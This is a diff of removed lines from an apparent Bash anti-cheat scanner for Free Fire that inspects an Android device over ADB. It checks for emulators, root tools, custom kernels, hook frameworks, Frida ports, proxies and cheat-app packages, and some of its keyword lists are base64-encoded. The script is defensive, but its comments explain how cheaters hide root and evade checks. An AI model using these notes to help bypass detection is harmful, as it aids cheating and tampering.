-    # una línea de getprop ('[clave]: [valor]'), dejando el valor pegado a la clave — por eso
-    # 'ro.kernel.qemu=1' nunca podía coincidir con "1" y esta confirmación fuerte jamás disparaba,
-    # incluso en un emulador real. Con '[^][]*' se extrae solo el último grupo (el valor).
-    QEMU_FLAG=$(echo "$PROP_CACHE" | grep "ro.kernel.qemu" | grep -oE '\[[^][]*\]$' | tr -d '[]')
-    if [ "$QEMU_FLAG" = "1" ]; then
-        log_output "${R}[!] EMULADOR CONFIRMADO (ro.kernel.qemu=1)${N}"
-        ((SUSPICIOUS_COUNT+=3)); TOOL_FOUND=1; STRONG_SIGNAL=1
-    fi
-
-    HARDWARE_VAL=$(echo "$PROP_CACHE" | grep -E '\[ro\.hardware\]|\[ro\.boot\.hardware\]' | grep -oE '\[[^][]*\]$' | tr -d '[]' | head -1)
-    if echo "$HARDWARE_VAL" | grep -qiE '^(goldfish|ranchu|vbox86)$'; then
-        log_output "${R}[!] EMULADOR CONFIRMADO (ro.hardware=$HARDWARE_VAL)${N}"
-        ((SUSPICIOUS_COUNT+=3)); TOOL_FOUND=1; STRONG_SIGNAL=1
-    fi
-
-    DEVICE_VAL=$(echo "$PROP_CACHE" | grep -E '\[ro\.product\.device\]|\[ro\.build\.product\]' | grep -oE '\[[^][]*\]$' | tr -d '[]' | head -1)
-    if echo "$DEVICE_VAL" | grep -qiE '^generic(_x86)?(_arm)?$'; then
-        log_output "${R}[!] EMULADOR CONFIRMADO (ro.product.device=$DEVICE_VAL)${N}"
-        ((SUSPICIOUS_COUNT+=3)); TOOL_FOUND=1; STRONG_SIGNAL=1
-    fi
-
-    MODEL_VAL=$(echo "$PROP_CACHE" | grep -E '\[ro\.product\.model\]' | grep -oE '\[[^][]*\]$' | tr -d '[]' | head -1)
-    if echo "$MODEL_VAL" | grep -qiE 'google_sdk|Android SDK built for|^sdk_gphone'; then
-        log_output "${R}[!] EMULADOR CONFIRMADO (ro.product.model=$MODEL_VAL)${N}"
-        ((SUSPICIOUS_COUNT+=3)); TOOL_FOUND=1; STRONG_SIGNAL=1
-    fi
-
-    # Lista ampliada de marcas de emuladores de juego conocidas (antes faltaba LDPlayer/Leidian,
-    # que es justamente uno de los más usados para correr Free Fire en PC, y MuMu/GameLoop).
-    EMULATOR_PROPS=$(echo "$PROP_CACHE" | grep -iE 'qemu|goldfish|vbox|genymotion|microvirt|nox|memu|bluestacks|andy|droid4x|ldplayer|leidian|mumu|gameloop|koplayer|msplayer' | grep -viE 'knox|samsung|\]: \[0\]|\]: \[\]')
-    if [ -n "$EMULATOR_PROPS" ]; then
-        log_output "${R}[!] Propiedades asociadas a emulador:${N}"
-        echo "$EMULATOR_PROPS" | while read -r line; do log_output "${Y}  $line${N}"; done
-        if [ $STRONG_SIGNAL -eq 1 ]; then
-            ((SUSPICIOUS_COUNT+=2))
-        else
-            log_output "${B}[*] Indicio aislado sin confirmar por hardware/device/qemu — se registra pero no suma puntaje por sí solo${N}"
-        fi
-        TOOL_FOUND=1
-    fi
-
-    QEMU_PROC=$(echo "$PS_CACHE" | grep -iE 'qemu|genymotion|bluestacks' | grep -viE 'knox')
-    if [ -n "$QEMU_PROC" ]; then
-        log_output "${R}[!] PROCESO DE EMULADOR DETECTADO${N}"
-        echo "$QEMU_PROC" | while read -r line; do log_output "${Y}  $line${N}"; done
-        ((SUSPICIOUS_COUNT+=2)); TOOL_FOUND=1; STRONG_SIGNAL=1
-    fi
-
-    # Apps de "teléfono en la nube" (LDCloud y similares): el juego corre en un Android remoto y el
-    # dispositivo físico solo controla la sesión, evadiendo cualquier check de hardware/props local.
-    CLOUDPHONE_PKG=$(echo "$PKG_CACHE" | grep -iE 'com\.ld\.cph|com\.ldcloud|cloudphone|cloud\.phone')
-    if [ -n "$CLOUDPHONE_PKG" ]; then
-        log_output "${R}[!] APP DE TELÉFONO EN LA NUBE INSTALADA:${N}"
-        _ctx "Apps como LDCloud ejecutan el juego en un Android remoto — el dispositivo físico solo controla la sesión a distancia"
-        echo "$CLOUDPHONE_PKG" | while read -r p; do log_output "${Y}  $p${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); TOOL_FOUND=1
-    fi
-
-    [ $TOOL_FOUND -eq 0 ] && log_output "${G}[✓] Dispositivo físico, sin emulador${N}"
-    echo ""
-}
-
-check_selinux() {
-    sec_hdr "ESTADO DE SELINUX"
-    SE=$(adb shell "getenforce 2>/dev/null" | tr -d '\r')
-    case "$SE" in
-        Enforcing)  log_output "${G}[✓] SELinux: Enforcing${N}" ;;
-        Permissive) log_output "${R}[!] SELinux PERMISSIVO — común en rooteados${N}"; _ctx "SELinux permissivo permite acceso irrestricto entre procesos — requerido por algunos módulos de cheat"; ((SUSPICIOUS_COUNT+=2)) ;;
-        Disabled)   log_output "${R}[!] SELinux DESACTIVADO${N}"; _ctx "Sin MAC enforcement — cualquier proceso puede inyectar en Free Fire sin restricciones"; ((SUSPICIOUS_COUNT+=3)) ;;
-        *)          log_output "${Y}[*] SELinux: estado desconocido ($SE)${N}" ;;
-    esac
-    echo ""
-}
-
-check_boot_state() {
-    sec_hdr "ESTADO DE BOOT VERIFICADO"
-    BOOT_STATE=$(echo "$PROP_CACHE" | grep '"ro.boot.verifiedbootstate"' | grep -oE '\[.*\]$' | tr -d '[]')
-    FLASH_LOCKED=$(echo "$PROP_CACHE" | grep '"ro.boot.flash.locked"' | grep -oE '\[.*\]$' | tr -d '[]')
-    VBMETA=$(echo "$PROP_CACHE" | grep '"ro.boot.vbmeta.device_state"' | grep -oE '\[.*\]$' | tr -d '[]')
-    WARRANTY=$(echo "$PROP_CACHE" | grep '"ro.boot.warranty_bit"' | grep -oE '\[.*\]$' | tr -d '[]')
-    log_output "${B}[*] verifiedbootstate:  ${W}${BOOT_STATE:-desconocido}${N}"
-    log_output "${B}[*] flash.locked:       ${W}${FLASH_LOCKED:-desconocido}${N}"
-    log_output "${B}[*] vbmeta.device_state:${W}${VBMETA:-desconocido}${N}"
-    log_output "${B}[*] warranty_bit:       ${W}${WARRANTY:-desconocido}${N}"
-    if [ "$BOOT_STATE" = "orange" ] || [ "$BOOT_STATE" = "red" ]; then
-        log_output "${R}[!] BOOTLOADER DESBLOQUEADO: $BOOT_STATE${N}"
-        _ctx "Bootloader desbloqueado es prerequisito para instalar custom kernels y Magisk — sin él no hay root persistente"
-        ((SUSPICIOUS_COUNT+=3))
-    fi
-    if [ "$FLASH_LOCKED" = "0" ]; then
-        log_output "${R}[!] flash.locked=0${N}"; ((SUSPICIOUS_COUNT+=2))
-    fi
-    if [ "$VBMETA" = "unlocked" ]; then
-        log_output "${R}[!] vbmeta.device_state=unlocked${N}"; ((SUSPICIOUS_COUNT+=2))
-    fi
-    if [ "$WARRANTY" = "1" ]; then
-        log_output "${Y}[!] warranty_bit=1 — bootloader desbloqueado anteriormente${N}"; ((SUSPICIOUS_COUNT++))
-    fi
-    BUILD_TAGS=$(echo "$PROP_CACHE" | grep '"ro.build.tags"' | grep -oE '\[.*\]$' | tr -d '[]')
-    if echo "$BUILD_TAGS" | grep -qiE "test-keys|dev-keys"; then
-        log_output "${R}[!] Build tags sospechosas: $BUILD_TAGS${N}"; ((SUSPICIOUS_COUNT+=2))
-    else
-        log_output "${G}[✓] Build tags: ${BUILD_TAGS}${N}"
-    fi
-    echo ""
-}
-
-check_kernel() {
-    sec_hdr "ANÁLISIS DE KERNEL"
-    KERNEL=$(adb shell 'uname -r 2>/dev/null' | tr -d '\r')
-    log_output "${B}[*] Kernel: ${W}$KERNEL${N}"
-    KSU_LOG=$(echo "$LOG_CACHE" | grep -iE "$(printf '%s%s' "$(printf 'a2VybmVsc3V8bWE='|base64 -d)" "$(printf 'Z2lza3xhcGF0Y2g='|base64 -d)")" | head -1)
-    if [ -n "$KSU_LOG" ]; then
-        log_output "${R}[!] KernelSU/Magisk/APatch en kernel log:${N}"
-        log_output "${Y}  $KSU_LOG${N}"; ((SUSPICIOUS_COUNT+=3))
-    fi
-    PROC_VER=$(adb shell "cat /proc/version 2>/dev/null" | tr -d '\r')
-    if echo "$PROC_VER" | grep -qiE "kernelsu|magisk|apatch|dirty|unofficial"; then
-        log_output "${R}[!] Kernel modificado en /proc/version${N}"
-        _ctx "Kernel no-stock puede incluir SuSFS, soporte KSU o patches para ocultar root a nivel de syscall"
-        log_output "${Y}  $PROC_VER${N}"; ((SUSPICIOUS_COUNT+=2))
-    fi
-    SUSFS=$(adb shell '{ test -d /proc/sys/fs/susfs && echo FOUND; } || { test -d /sys/kernel/security/susfs && echo FOUND; } || echo NOTFOUND' | tr -d '\r')
-    PAGE_SIZE=$(adb shell "getprop ro.product.cpu.pagesize.max 2>/dev/null || cat /proc/sys/vm/mmap_min_addr 2>/dev/null" | tr -d '\r')
-    if echo "$SUSFS" | grep -q "FOUND"; then
-        if echo "$KERNEL" | grep -qE "\-16k|16k" || [ "$PAGE_SIZE" = "16384" ]; then
-            log_output "${B}[*] SuSFS-16k presente (kernel con páginas 16K — informativo)${N}"
-        else
-            log_output "${B}[*] SuSFS-4k presente (informativo — presente en kernels stock recientes)${N}"
-        fi
-    else
-        log_output "${G}[✓] SuSFS no detectado${N}"
-    fi
-    CUSTOM_KERNELS=$(echo "$KERNEL" | grep -iE "$(printf '%s%s' "$(printf 'YWx1Y2FyZHxjaHJvbm9zfHN1bHRhbnxseWNoZWV8ZXVyZWthfGV0aGVyZWFs'|base64 -d)" "$(printf 'fGVsaXRla2VybmVsfHdpbGR8YnVkZHl8cGFuZGF8cmVkbWktb2N8YXBhdGNo'|base64 -d)")")
-    if [ -n "$CUSTOM_KERNELS" ]; then
-        log_output "${R}[!] Kernel custom con soporte root: $CUSTOM_KERNELS${N}"
-        _ctx "Kernels como sultan/lychee/alucard/cronos incluyen KSU o SuSFS precompilado — evasión a nivel de kernel desde el inicio"
-        ((SUSPICIOUS_COUNT+=2))
-    fi
-
-    KSUNEXT_PROP=$(echo "$PROP_CACHE" | grep -im1 'ksunext\|com\.rifsxd')
-    if [ -n "$KSUNEXT_PROP" ]; then
-        log_output "${R}[!] KernelSU Next detectado en props: $KSUNEXT_PROP${N}"; ((SUSPICIOUS_COUNT+=3))
-    fi
-    if [ -n "$KSU_MOUNT" ]; then
-        log_output "${R}[!] Módulos KernelSU montados:${N}"
-        echo "$KSU_MOUNT" | while read -r line; do log_output "${Y}  $line${N}"; done
-        ((SUSPICIOUS_COUNT+=2))
-    fi
-    echo ""
-}
-
-check_suspicious_packages() {
-    sec_hdr "APLICACIONES SOSPECHOSAS / ROOT / CHEAT"
-    declare -A SUSP_APPS
-    SUSP_APPS=(
-        ["com.topjohnwu.magisk"]="Magisk"
-        ["io.github.magisk"]="Magisk"
-        ["com.rifsxd.ksunext"]="KernelSU Next"
-        ["me.weishu.kernelsu"]="KernelSU"
-        ["me.bmax.apatch"]="APatch"
-        ["io.github.huskydg.magisk"]="Magisk Delta"
-        ["org.lsposed.manager"]="LSPosed Manager"
-        ["com.dergoogler.mmrl"]="MMRL"
-        ["com.googleplay.ndkvs"]="FF Modificado (.ndkvs)"
-        ["eu.sisik.hackendebug"]="Hack&Debug"
-        ["me.piebridge.brevent"]="Brevent"
-        ["com.netflix.mediaclientxx"]="Netflix FALSO (cliente ADB embebido)"
-        ["com.netflix.mediaclient.xx"]="Netflix FALSO variante"
-        ["io.github.mhmrdd.libxposed.ps.passit"]="Passador de Replay (Xposed)"
-        ["com.lexa.fakegps"]="Fake GPS"
-        ["io.github.gamesiru"]="GameSiru (Panel Free Fire)"
-        ["com.gamesiru.launcher"]="GameSiru Launcher"
-        ["com.zhtools.chronos"]="Chronos (Panel FF)"
-        ["com.aryanvichare.freefireonetap"]="FF OneTap Cheat"
-        ["io.github.ggmouse"]="GG Mouse (Replay Tool)"
-        ["com.gg.mouse"]="GG Mouse"
-        ["org.chickenhook.restrictionbypass"]="RestrictionBypass"
-        ["io.github.lsposed.manager"]="LSPosed Manager"
-        ["io.github.vvb2060.mahoshojo"]="TrickyStore (Bypass)"
-        ["com.opa334.TrollStore"]="TrollStore"
-        ["com.reveny.nativecheck"]="NativeCheck"
-        ["com.studio.duckdetector"]="Duck Detector"
-        ["io.github.huskydg.memorydetector"]="MemoryDetector"
-        ["moe.shizuku.privileged.api"]="Shizuku"
-        ["moe.shizuku.starter"]="Shizuku"
-        ["com.zhenxi.hunter"]="Shizuku Hunter"
-        ["com.system.update.service"]="Servicio falso del sistema"
-    )
-    PKG_LIST="$PKG_CACHE"
-    FOUND_SUSP=0
-    for pkg in "${!SUSP_APPS[@]}"; do
-        if echo "$PKG_LIST" | grep -q "package:$pkg"; then
-            log_output "${R}[!] App sospechosa: ${SUSP_APPS[$pkg]} ($pkg)${N}"
-            FOUND_SUSP=1; ((SUSPICIOUS_COUNT+=2))
-            case "$pkg" in
-                *lsposed*) log_output "${B}    ↳ LSPosed hookea el proceso Zygote — modifica Free Fire antes de que inicie${N}"; FOUND_LSPACED=1 ;;
-                *shizuku*|*zhenxi*) FOUND_SHIZUKU=1 ;;
-                *) FOUND_CHEAT_APP=1 ;;
-            esac
-        fi
-    done
-    log_output "${B}[+] Verificando instalador de $GAME_PKG...${N}"
-    INSTALLER=$(adb shell "dumpsys package $GAME_PKG 2>/dev/null | grep 'installerPackageName'" | tr -d '\r' | head -1)
-    if [ -n "$INSTALLER" ]; then
-        log_output "${B}[*] $INSTALLER${N}"
-        if echo "$INSTALLER" | grep -qiE "null|adb|sideload|bin.mt.plus|android.chrome|com.android.chrome"; then
-            log_output "${R}[!] Instalador sospechoso: $INSTALLER${N}"; ((SUSPICIOUS_COUNT+=2)); FOUND_SUSP=1
-        fi
-    fi
-
-    log_output "${B}[+] Verificando wrapper/modificación del juego...${N}"
-    # Método 1: pm dump wrapper flag
-    WRAPPER=$(adb shell "pm dump $GAME_PKG 2>/dev/null | grep -i wrapper" | tr -d '\r')
-    if [ -n "$(echo "$WRAPPER" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] WRAPPER FLAG DETECTADO:${N}"
-        _ctx "Flag wrapper indica que el juego corre dentro de otro proceso — permite inyección de código sin detección directa"
-        echo "$WRAPPER" | head -3 | while read -r l; do [ -n "$l" ] && log_output "${Y}  $l${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); FOUND_SUSP=1; FOUND_WRAPPER=1
-    fi
-    # Método 2 (KellerSS): verificar archivos de frameworks de hooks en directorio del juego
-    for _hook_file in "libxposed_art.so" "libEdXposed.so" "libzygisk.so" "liblsplant.so" "librirud.so" "libapatch.so"; do
-        _hf_found=$(adb shell "find /data/app/ -name '$_hook_file' 2>/dev/null | head -1" | tr -d '\r')
-        if [ -n "$_hf_found" ]; then
-            log_output "${R}[!] Archivo de hook framework detectado: $_hook_file${N}"
-            _ctx "Librería de hook framework en sistema — LSPosed/Xposed/APatch pueden modificar cualquier función de Free Fire"
-            log_output "${Y}  Ruta: $_hf_found${N}"
-            ((SUSPICIOUS_COUNT+=4)); FOUND_SUSP=1; FOUND_WRAPPER=1
-        fi
-    done
-    # Método 3 (KellerSS): verificar firmas de APKs de hook en /data/local/tmp y /sdcard
-    for _hook_path in "/data/local/tmp" "/sdcard/Download"; do
-        _apks=$(adb shell "find '$_hook_path' -name '*.apk' 2>/dev/null" | tr -d '\r' | grep -v 'unknown-monitor.apk')
-        if [ -n "$_apks" ]; then
-            log_output "${B}[*] APKs presentes en $_hook_path:${N}"
-            echo "$_apks" | while read -r _a; do [ -n "$_a" ] && log_output "${W}  $_a${N}"; done
-            _apks_susp=$(echo "$_apks" | grep -iE 'cheat|hack|wallhack|\besp\b|aimbot|inject|wrapper|lsposed|xposed|magisk|\bmod\b|mods|modded|ffh4x|apkmod|keygen|crack|mt_manager|mtmanager')
-            if [ -n "$_apks_susp" ]; then
-                log_output "${R}[!] APK con nombre asociado a cheats en $_hook_path:${N}"
-                echo "$_apks_susp" | while read -r _a; do [ -n "$_a" ] && log_output "${Y}  $_a${N}"; done
-                ((SUSPICIOUS_COUNT+=3)); FOUND_SUSP=1
-            fi
-        fi
-    done
-
-    log_output "${B}[+] Verificando indicadores de APK crackeado...${N}"
-    CRACKED=$(adb shell "pm dump $GAME_PKG 2>/dev/null | grep -iE 'cracked|modded|lsposed'" | tr -d '\r')
-    if [ -n "$(echo "$CRACKED" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] APK CRACKEADO/MODIFICADO DETECTADO:${N}"
-        echo "$CRACKED" | head -3 | while read -r l; do [ -n "$l" ] && log_output "${Y}  $l${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); FOUND_SUSP=1
-    fi
-
-    [ $FOUND_SUSP -eq 0 ] && log_output "${G}[✓] Sin apps sospechosas${N}"
-    echo ""
-}
-
-check_network_ports() {
-    sec_hdr "PUERTOS Y CONEXIONES SOSPECHOSAS"
-    log_output "${B}[+] Verificando puertos Frida (27042/27043)...${N}"
-    FRIDA_PORT=$(echo "$TCP_CACHE" | grep -iE ':(69B2|69B3) ' | grep -E ' 0A ' | head -3)
-    if [ -n "$(echo "$FRIDA_PORT" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] PUERTOS FRIDA EN LISTEN:${N}"
-        _ctx "Frida es framework de instrumentación dinámica — hookea funciones de Free Fire en tiempo real para modificar comportamiento"
-        echo "$FRIDA_PORT" | while read -r line; do [ -n "$line" ] && log_output "${Y}  $line${N}"; done
-        ((SUSPICIOUS_COUNT+=3))
-    else
-        log_output "${G}[✓] Sin puertos Frida${N}"
-    fi
-    log_output "${B}[+] Verificando proxy HTTP...${N}"
-    HTTP_PROXY=$(adb shell "settings get global http_proxy 2>/dev/null" | tr -d '\r')
-    if [ -n "$HTTP_PROXY" ] && [ "$HTTP_PROXY" != "null" ] && [ "$HTTP_PROXY" != ":0" ]; then
-        log_output "${R}[!] PROXY HTTP: $HTTP_PROXY${N}"; ((SUSPICIOUS_COUNT+=2))
-    else
-        log_output "${G}[✓] Sin proxy HTTP${N}"
-    fi
-    log_output "${B}[+] Verificando proxy Wi-Fi...${N}"
-    WIFI_PROXY=$(adb shell "content query --uri content://settings/global/wifi_proxy_host 2>/dev/null" | tr -d '\r')
-    if echo "$WIFI_PROXY" | grep -qE "value=.+[^null]"; then
-        log_output "${R}[!] Proxy Wi-Fi configurado: $WIFI_PROXY${N}"; ((SUSPICIOUS_COUNT+=2))
-    else
-        log_output "${G}[✓] Sin proxy Wi-Fi${N}"
-    fi
-    echo ""
-}
-
-check_nmap_portscan() {
-    sec_hdr "ESCANEO EXTERNO DE PUERTOS (NMAP)"
-    if ! command -v nmap >/dev/null 2>&1; then
-        log_output "${Y}[*] nmap no instalado, instalando...${N}"
-        pkg install -y nmap >/dev/null 2>&1
-    fi
-    if ! command -v nmap >/dev/null 2>&1; then
-        log_output "${R}[!] No se pudo instalar nmap — se omite el escaneo externo${N}"
-        echo ""
-        return
-    fi
-    TARGET_IP=$(adb shell "ip route get 1.1.1.1 2>/dev/null" | tr -d '\r' | grep -oE 'src [0-9.]+' | awk '{print $2}')
-    [ -z "$TARGET_IP" ] && TARGET_IP=$(adb shell "ip addr show wlan0 2>/dev/null" | tr -d '\r' | grep -oE 'inet [0-9.]+' | awk '{print $2}' | head -1)
-    if [ -z "$TARGET_IP" ]; then
-        log_output "${Y}[*] No se pudo obtener la IP del dispositivo (¿WiFi apagado o sin ruta?) — se omite${N}"
-        echo ""
-        return
-    fi
-    log_output "${B}[*] IP del dispositivo: ${W}$TARGET_IP${N}"
-    log_output "${B}[+] nmap -p 5500-5600 -sV (verifica a nivel de red real, no puede ser falseado por hooks locales)...${N}"
-    NMAP_OUT=$(timeout 90 nmap -p 5500-5600 -sV "$TARGET_IP" 2>/dev/null)
-    echo "$NMAP_OUT" | while read -r line; do [ -n "$line" ] && log_output "${W}  $line${N}"; done
-    if echo "$NMAP_OUT" | grep -qE '^55[0-9]{2}/tcp[[:space:]]+open'; then
-        log_output "${B}[*] Puerto ADB abierto según nmap (informativo — si escaneaste por wifi, es el mismo puerto que usa el scanner para conectarse)${N}"
-    fi
-    echo ""
-}
-
-check_adb_connections() {
-    sec_hdr "CONEXIONES ADB / CONTROL REMOTO"
-    USB_STATE=$(adb shell "getprop sys.usb.state 2>/dev/null" | tr -d '\r')
-    log_output "${B}[*] USB state: ${W}${USB_STATE:-desconocido}${N}"
-
-    ADB_TCP_PORT=$(adb shell "getprop service.adb.tcp.port 2>/dev/null" | tr -d '\r')
-    if [ -n "$ADB_TCP_PORT" ] && [ "$ADB_TCP_PORT" != "-1" ]; then
-        log_output "${R}[!] ADB INALÁMBRICO ACTIVO (puerto TCP $ADB_TCP_PORT)${N}"
-        _ctx "ADB por TCP/IP permite control remoto sin cable — se usa para inyectar inputs o desplegar hooks sin acceso físico al dispositivo"
-        ((SUSPICIOUS_COUNT+=2))
-    fi
-    SS_5555=$(adb shell "ss -tuln 2>/dev/null | grep ':5555'" | tr -d '\r')
-    if [ -n "$(echo "$SS_5555" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] PUERTO 5555 ABIERTO (ss -tuln)${N}"
-        _ctx "Confirma por segunda vía (además de getprop) que el puerto estándar de ADB inalámbrico está escuchando"
-        ((SUSPICIOUS_COUNT+=2))
-    fi
-    ADB_WIFI_SETTING=$(adb shell "settings get global adb_wifi_enabled 2>/dev/null" | tr -d '\r')
-    if [ "$ADB_WIFI_SETTING" = "1" ]; then
-        log_output "${B}[*] Depuración inalámbrica habilitada en Ajustes (esperable si escaneaste por wifi)${N}"
-    fi
-
-    JDWP_PIDS=$(timeout 2 adb jdwp 2>/dev/null | tr -d '\r')
-    if [ -n "$(echo "$JDWP_PIDS" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] PROCESOS JDWP-DEBUGGABLE ACTIVOS:${N}"
-        _ctx "JDWP permite adjuntar un debugger Java en runtime — se usa para inspeccionar y modificar memoria del proceso del juego en vivo"
-        echo "$JDWP_PIDS" | while read -r pid; do [ -n "$pid" ] && log_output "${Y}  PID: $pid${N}"; done
-        ((SUSPICIOUS_COUNT+=3))
-    fi
-
-    ADB_READ_FAIL=$(echo "$LOG_CACHE" | grep -c "AdbDebuggingManager.*Read failed" 2>/dev/null || echo 0)
-    if [ "${ADB_READ_FAIL:-0}" -gt 6 ] 2>/dev/null; then
-        log_output "${Y}[*] AdbDebuggingManager: $ADB_READ_FAIL fallos de lectura de claves (informativo — reconexiones normales también generan esto)${N}"
-    fi
-
-    # Antes esto matcheaba 'usb|mtp|device|connect|disconnect' contra las últimas 500 líneas de
-    # logcat: eso captura prácticamente cualquier actividad normal del sistema (wifi, notificaciones,
-    # el propio scanner conectándose por ADB) y disparaba en casi todos los escaneos. Ahora solo se
-    # buscan eventos que son específicos de una revocación real de autorización ADB.
-    USB_REVOKE_LOG=$(adb shell "logcat -v time -d -t 500 2>/dev/null | grep -iE 'adb.*(revok|unauthoriz)|keys?.*(cleared|removed).*adb|AdbDebuggingManager.*(onDisconnect|[Rr]evoke)'" | tr -d '\r' | grep -vE 'adbd|logcat|adb shell' | tail -10)
-    if [ -n "$(echo "$USB_REVOKE_LOG" | tr -d '[:space:]')" ]; then
-        log_output "${Y}[*] Eventos de revocación ADB en logcat:${N}"
-        _ctx "Revocar autorizaciones ADB desde Ajustes de desarrollador puede usarse para borrar el rastro de qué PC estuvo conectada"
-        echo "$USB_REVOKE_LOG" | while read -r line; do [ -n "$line" ] && log_output "${W}  $line${N}"; done
-    fi
-
-    WIRELESS_ADB_HIST=$(adb shell "dumpsys activity broadcasts history 2>/dev/null | grep -iE 'adb_wifi|WIRELESS_DEBUG|adb.*pairing' | head -5" | tr -d '\r')
-    if [ -n "$(echo "$WIRELESS_ADB_HIST" | tr -d '[:space:]')" ]; then
-        log_output "${B}[*] Historial de activación de ADB inalámbrico (informativo — el propio scanner usa ADB inalámbrico, no cuenta como sospechoso por sí solo):${N}"
-        echo "$WIRELESS_ADB_HIST" | while read -r l; do [ -n "$l" ] && log_output "${W}  $l${N}"; done
-    fi
-
-    DATA_ADB_PROCS=$(adb shell 'for f in /proc/[0-9]*/exe; do l=$(readlink "$f" 2>/dev/null); case "$l" in /data/adb/*ksud*|/data/adb/*magiskd*|/data/adb/*apd*) continue;; /data/adb/*) echo "${f%%/exe}: $l";; esac; done 2>/dev/null | head -5' | tr -d '\r')
-    if [ -n "$(echo "$DATA_ADB_PROCS" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] Procesos desde /data/adb/:${N}"
-        echo "$DATA_ADB_PROCS" | while read -r line; do [ -n "$line" ] && log_output "${Y}  $line${N}"; done
-        ((SUSPICIOUS_COUNT+=2))
-    else
-        log_output "${G}[✓] Sin procesos inesperados en /data/adb/${N}"
-    fi
-    echo ""
-}
-
-check_uninstalled_apps() {
-    sec_hdr "APPS SOSPECHOSAS DESINSTALADAS"
-    UNINST=$(adb shell "dumpsys batterystats 2>/dev/null | grep -oE 'pkgunin=[0-9]+:\"[^\"]+\"' | grep -oE '\"[^\"]+\"' | tr -d '\"' | sort -u" | tr -d '\r')
-
-    # dumpsys connectivity guarda su propio historial de paquetes removidos (limpieza de políticas
-    # de red por UID) con su propio ciclo de rotación, distinto al de batterystats/logcat — se suma
-    # como tercera fuente independiente para pescar desinstalaciones que las otras dos ya perdieron.
-    CONN_UNINST_RAW=$(adb shell "dumpsys connectivity 2>/dev/null | grep -iE 'UNINSTALLED|package.?remov'" | tr -d '\r')
-    CONN_UNINST=$(echo "$CONN_UNINST_RAW" | grep -oE '[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*){2,}' | sort -u)
-
-    ALL_UNINST=$(printf '%s\n%s' "$UNINST" "$CONN_UNINST" | grep -v '^$' | sort -u)
-    FOUND_U=0
-    if [ -n "$ALL_UNINST" ]; then
-        while read -r pkg; do
-            [ -z "$pkg" ] && continue
-            if echo "$pkg" | grep -qiE "magisk|xposed|kernelsu|apatch|frida|hook|cheat|hack|bypass|inject|passit"; then
-                log_output "${Y}[!] App sospechosa desinstalada: $pkg${N}"; ((SUSPICIOUS_COUNT++)); FOUND_U=1
-            fi
-        done <<< "$ALL_UNINST"
-    fi
-    [ $FOUND_U -eq 0 ] && log_output "${G}[✓] Sin apps sospechosas en historial${N}"
-    if [ -n "$(echo "$CONN_UNINST" | tr -d '[:space:]')" ] && [ -z "$(echo "$UNINST" | tr -d '[:space:]')" ]; then
-        log_output "${B}[*] Historial recuperado vía dumpsys connectivity (batterystats no tenía datos)${N}"
-    fi
-
-    _since=$(date -d '-1 day' '+%m-%d %H:%M:%S.000' 2>/dev/null)
-    if [ -n "$_since" ]; then
-        UNINSTALL_RAW=$(adb shell "logcat -v time -d -T '$_since' 2>/dev/null | grep -iE 'PackageManager|PackageInstaller'" | tr -d '\r')
-    else
-        UNINSTALL_RAW=$(adb shell "logcat -v time -d -t 3000 2>/dev/null | grep -iE 'PackageManager|PackageInstaller'" | tr -d '\r')
-    fi
-    UNINSTALL_LOG=$(echo "$UNINSTALL_RAW" | grep -iE 'delet|uninstall|remov' | grep -vE 'adbd|logcat|adb shell' | head -10)
-    if [ -n "$(echo "$UNINSTALL_LOG" | tr -d '[:space:]')" ]; then
-        log_output "${Y}[*] Desinstalaciones en las últimas 24h:${N}"
-        echo "$UNINSTALL_LOG" | while read -r line; do
-            [ -z "$line" ] && continue
-            _pkgname=$(echo "$line" | grep -oE '[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*){2,}' | head -1)
-            log_output "${W}  $line${N}"
-            [ -n "$_pkgname" ] && log_output "${Y}    ↳ app: $_pkgname${N}"
-        done
-        if echo "$UNINSTALL_LOG" | grep -qiE '2000|shell'; then
-            log_output "${R}[!] Desinstalación con UID Shell (2000) detectada — ejecutada por comando, no desde Ajustes${N}"
-            _ctx "adb shell pm uninstall deja este rastro en logcat — técnica común para borrar apps de cheat justo después de terminar la partida"
-            ((SUSPICIOUS_COUNT+=3))
-        fi
-        [ -n "$NEWEST_MTIME" ] && log_output "${B}[*] Replay más reciente: $NEWEST_MTIME — compará el horario con los eventos de arriba${N}"
-    fi
-    echo ""
-}
-
-check_media_projection() {
-    sec_hdr "CAPTURA DE PANTALLA / MEDIA PROJECTION"
-    MEDIA_PROJ=$(adb shell "dumpsys media_projection 2>/dev/null | grep -iE 'isRecording=true|state.*record|projection.*active' | head -5" | tr -d '\r')
-    if [ -n "$(echo "$MEDIA_PROJ" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] CAPTURA DE PANTALLA ACTIVA:${N}"
-        _ctx "MediaProjection activa durante el juego indica grabación o transmisión en vivo — herramienta de replay externo activa"
-        echo "$MEDIA_PROJ" | while read -r line; do [ -n "$line" ] && log_output "${Y}  $line${N}"; done
-        ((SUSPICIOUS_COUNT+=2))
-    else
-        log_output "${G}[✓] Sin captura de pantalla activa${N}"
-    fi
-    echo ""
-}
-
-check_data_local_tmp() {
-    sec_hdr "ARCHIVOS EN /DATA/LOCAL/TMP"
-    TMP_FILES=$(adb shell 'for f in /data/local/tmp/* /data/local/tmp/.*; do n="${f##*/}"; case "$n" in "." | "..") ;; *) [ -e "$f" ] && echo "$n";; esac; done' | tr -d '\r' | grep -vE '^unknown-monitor\.apk$|^unknown_monitor\.txt$|^unknown_logs\.txt$')
-    # Detectar si /data/local/tmp fue modificado recientemente pero está vacío
-    _tmp_mtime=$(adb shell "stat /data/local/tmp 2>/dev/null | grep -i 'Modify\|modify'" | tr -d '\r' | head -1)
-    if [ -z "$(echo "$TMP_FILES" | tr -d '[:space:]')" ] && [ -n "$_tmp_mtime" ]; then
-        _tmp_age=$(adb shell "find /data/local/tmp -maxdepth 0 -newer /proc/uptime -mmin -30 2>/dev/null" | tr -d '\r')
